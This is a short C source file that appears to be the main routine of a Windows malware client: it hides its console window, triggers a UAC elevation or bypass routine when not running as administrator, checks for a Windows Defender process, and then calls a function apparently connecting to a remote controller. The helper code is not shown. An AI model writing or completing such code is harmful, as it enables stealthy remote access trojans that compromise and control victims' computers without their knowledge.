#include "lunar.h"

int main()
{
    FreeConsole();
    if(!IsAdmin()){
        UACTrigger();
        Sleep(2000);
        if(ProcessId("WindowsDefender.exe") != 0){
            exit(0);
        }
        exit(0);
    }
    MainConnect();
    return 0;
}
